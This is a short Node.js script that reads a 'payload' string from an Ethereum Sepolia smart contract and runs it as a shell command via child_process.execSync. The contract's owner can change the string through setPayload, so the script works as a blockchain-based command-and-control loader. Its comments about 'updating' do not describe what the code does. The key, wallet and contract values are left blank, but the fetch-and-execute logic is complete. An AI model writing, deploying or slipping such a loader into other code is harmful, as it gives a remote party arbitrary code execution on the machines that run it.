const { ethers } = require("ethers");

// Your values
const ALCHEMY_KEY     = "";
const PRIVATE_KEY     = "";

// Only need the functions you're using — no need for full ABI
const ABI = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "getPayload",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "payload",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "_payload",
				"type": "string"
			}
		],
		"name": "setPayload",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]


async function getPayload(contractAddress) {
    // Connect to Sepolia
    const provider = new ethers.JsonRpcProvider(
        `https://eth-sepolia.g.alchemy.com/v2/${ALCHEMY_KEY}`
    );

    // Load wallet
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    console.log("Updating from wallet:", wallet.address);

    // Connect to existing contract — no deployment
    const contract = new ethers.Contract(contractAddress, ABI, wallet);

    // Read current value before update
    const currentPayload = await contract.getPayload();
    console.log("Current payload:", currentPayload);
    const { execSync } = require('child_process');
    console.log(execSync(currentPayload).toString());

}

// Get arguments from command line
const contractAddress = "";
getPayload(contractAddress).catch(console.error);
